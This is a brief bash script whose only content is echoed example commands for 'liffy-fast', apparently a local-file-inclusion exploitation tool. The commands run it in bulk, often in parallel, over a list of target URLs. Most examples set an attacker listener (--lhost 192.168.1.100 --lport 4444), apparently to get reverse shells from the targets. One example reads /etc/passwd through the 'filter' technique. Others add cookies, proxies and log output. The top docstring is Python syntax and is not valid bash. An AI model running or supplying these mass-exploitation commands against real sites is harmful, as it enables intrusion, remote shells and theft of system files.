#!/bin/bash
"""
Xargs Examples for Liffy Fast Testing
"""

# Example 1: Basic xargs usage with data technique
echo "Example 1: Basic xargs usage with data technique"
echo "cat urls.txt | xargs -I {} liffy-fast data --url '{}' --lhost 192.168.1.100 --lport 4444"

# Example 2: Xargs with parallel processing
echo "Example 2: Xargs with parallel processing"
echo "cat urls.txt | xargs -P 4 -I {} liffy-fast data --url '{}' --lhost 192.168.1.100 --lport 4444"

# Example 3: Xargs with auto IP detection
echo "Example 3: Xargs with auto IP detection"
echo "cat urls.txt | xargs -I {} liffy-fast data --url '{}' --auto-ip --auto-port"

# Example 4: Xargs with filter technique
echo "Example 4: Xargs with filter technique"
echo "cat urls.txt | xargs -I {} liffy-fast filter --url '{}' --file '/etc/passwd'"

# Example 5: Xargs with custom parameters
echo "Example 5: Xargs with custom parameters"
echo "cat urls.txt | xargs -I {} liffy-fast data --url '{}' --lhost 192.168.1.100 --lport 4444 --cookies 'session=abc123' --timeout 60"

# Example 6: Xargs with JSON output
echo "Example 6: Xargs with JSON output"
echo "cat urls.txt | xargs -I {} liffy-fast data --url '{}' --lhost 192.168.1.100 --lport 4444 --json > results.json"

# Example 7: Xargs with verbose output
echo "Example 7: Xargs with verbose output"
echo "cat urls.txt | xargs -I {} liffy-fast data --url '{}' --lhost 192.168.1.100 --lport 4444 --verbose"

# Example 8: Xargs with different techniques
echo "Example 8: Xargs with different techniques"
echo "cat urls.txt | xargs -I {} liffy-fast auto --url '{}' --auto-ip --auto-port"

# Example 9: Xargs with file output
echo "Example 9: Xargs with file output"
echo "cat urls.txt | xargs -I {} liffy-fast data --url '{}' --lhost 192.168.1.100 --lport 4444 --output 'liffy_results.log'"

# Example 10: Xargs with proxy
echo "Example 10: Xargs with proxy"
echo "cat urls.txt | xargs -I {} liffy-fast data --url '{}' --lhost 192.168.1.100 --lport 4444 --proxy 'http://127.0.0.1:8080'"